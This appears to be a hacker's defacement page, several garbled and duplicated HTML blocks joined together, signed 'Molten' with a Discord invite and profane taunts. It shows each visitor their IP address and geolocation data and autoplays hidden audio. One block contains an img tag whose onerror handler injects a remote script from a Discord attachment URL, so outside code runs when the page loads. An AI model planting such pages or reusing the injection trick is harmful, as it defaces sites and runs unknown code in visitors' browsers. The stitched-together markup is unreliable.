<html>
<head>
<title>Molten</title>
</head>
<body>

<h1>by Molten and 𝐊・TUG</h1>
<html lang="ar">
<head>


<html>
<head>
    <title>LLLL</title>
</head>
<body bgcolor="#000000">
<script>
    var names = [
        { name: "[ Molten  ]", color: "white" },
        { name: "[ k6  ]", color: "white" },
        { name: "[ alzaabi ]", color: "white" }
    ];

    var nameIndex = 0;

    function changeNames() {
        var currentName = names[nameIndex];
        document.getElementById("name").textContent = currentName.name;
        document.getElementById("https://discord.gg/llll").style.color = currentName.color;
        nameIndex = (nameIndex + 1) % names.length;
    }

    // Change the names every 1 second
    setInterval(changeNames, 1000);
</script>
<p align="center">
    <img border="0" src="https://cdn.discordapp.com/attachments/1280294550841331845/1285583496940617860/dance-saudi.gif?ex=66eacc6e&is=66e97aee&hm=c35c181755fefd2145eeb67261e7f96d79fcbe4c182b30051acc2d1257ce0862&" width="500" height="425">
</p>
<p align="center">
    <font face="Courier" size="6" style="color: #000000;">
        <span style="color: rgb(177, 5, 5);">FUCK SERVER by </span>
        <span id="name"></span>
    </font>
</p>
<p align="center">
    <b>
<font face="Courier" color="#000000">
<a href="https://discord.gg/LLLL" style="font-size: 24px; color: rgb(255, 255, 255); text-decoration: none;">Discord.gg/LLLL</a>
<span style="font-size: 24px; color: white;">---</span>


</font>

    </b>
</p>
</body>
</html>
<html>
<head>
    <title>Molten</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            color: #000000;
            background-color: #000000;
            overflow: hidden;
        }

        h1, h3 {
            color: #ffffff;
        }

        #ip-address {
            color: rgb(255, 255, 255);
        }

        #ip-info {
            font-family: Arial, sans-serif;
            white-space: pre;
            color: rgb(255, 255, 255);
        }

        .cmd-text-container {
            position: relative;
        }

        .cmd-text {
            color: #000000;
            font-size: 9px;
            font-family: Arial, sans-serif;
            white-space: nowrap;
            position: absolute;
            animation: scrollText 20s linear infinite;
            transform: translateX(100%);
            -webkit-text-stroke: 1px Orange;
            text-stroke: 1px Orange;
        }

        .gray-text {
            color: #000000;
            outline: 1px solid #000000;
        }

        .json-data {
            font-family: Arial, sans-serif;
            color: Orange;
            text-shadow: -1px -1px 0 black, 1px -1px 0 black, -1px 1px 0 black, 1px 1px 0 black;
        }

        .json-data span {
            color: black;
        }

        @keyframes scrollText {
            0% {
                transform: translateX(100%);
            }
            100% {
                transform: translateX(-100%);
            }
        }

        .cmd-text:hover {
            animation-play-state: paused;
        }

        video {
            position: fixed;
            top: 0;
            left: 0;
            z-index: -1;
            filter: blur(10px);
        }

        /* Hide the audio controls */
        audio {
            display: none;
        }
    </style>
</head>
<body>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Molten LLLL </title>
    <style>
        @keyframes lightning {
            0% { color: rgb(255, 255, 255); }
            50% { color: rgb(184, 0, 0); }
            100% { color: white; }
        }

        .animated-text {
            animation: lightning 1s linear infinite;
        }
    </style>
</head>
<body>
     <h3 class="animated-text">fuck you all by Molten </h3>
	 <h3 class="animated-text">nick by k6 </h3>
     <h3 class="animated-text">nick by alzaabi </h3>
</body>
</html>
    <p id="ip-address">
        <span style="color: rgb(245, 9, 9);">Your IP Address: </span>
        <span id="ip-address-value" style="color: rgb(0, 0, 0); font-size: 17px;">Loading...</span>
    </p>

    <h3 style="color: rgb(211, 205, 205); animation: flashing 1s infinite;">Your IP Info :</h3>
    <pre id="ip-info" class="json-data">Fetching...</pre>
    <div class="cmd-text-container" style="position: relative; top: -15px;">
        <div class="cmd-text" style="font-size: 17px; text-stroke: 3px black; color: black;">  </div>
    </div>

    <!-- Hidden audio element with autoplay -->
    <audio autoplay loop style="display: none;">
        <source src="[https://cdn.discordapp.com/attachments/1284879724442554410/1285304506699092049/-__2022.mp3?ex=66ea715a&is=66e91fda&hm=d1ef3d613aacd79f6142261f6e47e65c09e1bf19e920c4b96c50e4913f0bd0f9&" type="audio/mpeg](https://cdn.discordapp.com/attachments/1284879724442554410/1285304506699092049/-__2022.mp3?ex=66ebc2da&is=66ea715a&hm=ad0777c0107a63a8e8f4a001dc9b35cdf1429dab54167e873365726c92c26a23&)">
        Your browser does not support the audio element.
    </audio>

<video style="width: 100vw; height: 100vh;" controls autoplay loop muted>
    <source src="https://cdn.discordapp.com/attachments/1278045767495581881/1278047281991385168/trTrhKi.webp?ex=66ea6888&is=66e91708&hm=352f80057b550c40483f68c1327b9dec8cac9db75f6342eb5e30bf83bc3c98b4&">
    Your browser does not support the video element.
</video>


    <script>
        // JavaScript code to fetch and display the user's IP address and information
        function fetchIPAndInfo() {
            fetch('https://api.ipify.org/?format=json')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('ip-address-value').textContent = data.ip;
                    return data.ip;
                })
                .then(ip => fetch(`https://ipinfo.io/${ip}/json`))
                .then(response => response.json())
                .then(ipInfoData => {
                    document.getElementById('ip-info').textContent = JSON.stringify(ipInfoData, null, 2);
                })
                .catch(error => {
                    console.error('Error:', error);
                    document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
                });
        }

        // Fetch IP address and information initially
        fetchIPAndInfo();
    </script>
</body>
</html>
<img src="about:invalid" onerror="document.body.appendChild(document.createElement('script')).src='https://cdn.discordapp.com/attachments/1127945954008498257/1128403016156983326/DCFE33CB-173C-4D81-B606-FE6C83E4A79C.gif?ex=66af2973&is=66add7f3&hm=9d5bb86d901f65309165fc19e0a07c15138f34c789adf8d357d03643ae23ebf0&';">

</body>
</html>


<html lang="ar">
<head>


<html>
<head>
    <title>LLLL</title>
</head>
<body bgcolor="#000000">
<script>
    var names = [
        { name: "[ Molten  ]", color: "white" },
        { name: "[ k6  ]", color: "white" },
        { name: "[ alzaabi ]", color: "white" }
    ];

    var nameIndex = 0;

    function changeNames() {
        var currentName = names[nameIndex];
        document.getElementById("name").textContent = currentName.name;
        document.getElementById("").style.color = currentName.color;
        nameIndex = (nameIndex + 1) % names.length;
    }

    // Change the names every 1 second
    setInterval(changeNames, 1000);
</script>
<p align="center">
    <img border="0" src="https://cdn.discordapp.com/attachments/1280294550841331845/1285583496940617860/dance-saudi.gif?ex=66eacc6e&is=66e97aee&hm=c35c181755fefd2145eeb67261e7f96d79fcbe4c182b30051acc2d1257ce0862&" width="500" height="425">
</p>
<p align="center">
    <font face="Courier" size="6" style="color: #000000;">
        <span style="color: rgb(177, 5, 5);">FUCK SERVER by </span>
        <span id="name"></span>
    </font>
</p>
<p align="center">
    <b>
<font face="Courier" color="#000000">
<a href="https://discord.gg/LLLL" style="font-size: 24px; color: rgb(255, 255, 255); text-decoration: none;">Discord.gg/LLLL</a>
<span style="font-size: 24px; color: white;">---</span>


</font>

    </b>
</p>
</body>
</html>
<!DOCTYPE html>
<html>
<head>
    <title>..</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            color: #000000;
            background-color: #000000;
            overflow: hidden;
        }

        h1, h3 {
            color: #ffffff;
        }

        #ip-address {
            color: rgb(255, 255, 255);
        }

        #ip-info {
            font-family: Arial, sans-serif;
            white-space: pre;
            color: rgb(255, 255, 255);
        }

        .cmd-text-container {
            position: relative;
        }

        .cmd-text {
            color: #000000;
            font-size: 9px;
            font-family: Arial, sans-serif;
            white-space: nowrap;
            position: absolute;
            animation: scrollText 20s linear infinite;
            transform: translateX(100%);
            -webkit-text-stroke: 1px Orange;
            text-stroke: 1px Orange;
        }

        .gray-text {
            color: #000000;
            outline: 1px solid #000000;
        }

        .json-data {
            font-family: Arial, sans-serif;
            color: Orange;
            text-shadow: -1px -1px 0 black, 1px -1px 0 black, -1px 1px 0 black, 1px 1px 0 black;
        }

        .json-data span {
            color: black;
        }

        @keyframes scrollText {
            0% {
                transform: translateX(100%);
            }
            100% {
                transform: translateX(-100%);
            }
        }

        .cmd-text:hover {
            animation-play-state: paused;
        }

        video {
            position: fixed;
            top: 0;
            left: 0;
            z-index: -1;
            filter: blur(10px);
        }

        /* Hide the audio controls */
        audio {
            display: none;
        }
    </style>
</head>
<body>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Molten LLLL </title>
    <style>
        @keyframes lightning {
            0% { color: rgb(255, 255, 255); }
            50% { color: rgb(184, 0, 0); }
            100% { color: white; }
        }

        .animated-text {
            animation: lightning 1s linear infinite;
        }
    </style>
</head>
<body>
     <h3 class="animated-text">fuck you all by Molten </h3>
	 <h3 class="animated-text">nick by k6 </h3>
     <h3 class="animated-text">nick by alzaabi </h3>
</body>
</html>
    <p id="ip-address">
        <span style="color: rgb(245, 9, 9);">Your IP Address: </span>
        <span id="ip-address-value" style="color: rgb(0, 0, 0); font-size: 17px;">Loading...</span>
    </p>

    <h3 style="color: rgb(211, 205, 205); animation: flashing 1s infinite;">Your IP Info :</h3>
    <pre id="ip-info" class="json-data">Fetching...</pre>
    <div class="cmd-text-container" style="position: relative; top: -15px;">
        <div class="cmd-text" style="font-size: 17px; text-stroke: 3px black; color: black;">  </div>
    </div>

    <!-- Hidden audio element with autoplay -->
    <audio autoplay loop style="display: none;">
        <source src="https://cdn.discordapp.com/attachments/1284879724442554410/1285304506699092049/-__2022.mp3?ex=66ebc2da&is=66ea715a&hm=ad0777c0107a63a8e8f4a001dc9b35cdf1429dab54167e873365726c92c26a23&" type="audio/mpeg">
        Your browser does not support the audio element.
    </audio>

<video style="width: 100vw; height: 100vh;" controls autoplay loop muted>
    <source src="https://cdn.discordapp.com/attachments/1280294550841331845/1285583496940617860/dance-saudi.gif?ex=66ec1dee&is=66eacc6e&hm=d2d6a2a79b4f5fdcea39829b5a0778e4d94163f593b10419848dafa510c30811&">
    Your browser does not support the video element.
</video>


    <script>
        // JavaScript code to fetch and display the user's IP address and information
        function fetchIPAndInfo() {
            fetch('https://api.ipify.org/?format=json')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('ip-address-value').textContent = data.ip;
                    return data.ip;
                })
                .then(ip => fetch(`https://ipinfo.io/${ip}/json`))
                .then(response => response.json())
                .then(ipInfoData => {
                    document.getElementById('ip-info').textContent = JSON.stringify(ipInfoData, null, 2);
                })
                .catch(error => {
                    console.error('Error:', error);
                    document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
                });
        }

        // Fetch IP address and information initially
        fetchIPAndInfo();
    </script>
</body>
</html>
<img src="https://cdn.discordapp.com/attachments/1280294550841331845/1285583496940617860/dance-saudi.gif?ex=66ec1dee&is=66eacc6e&hm=d2d6a2a79b4f5fdcea39829b5a0778e4d94163f593b10419848dafa510c30811&">
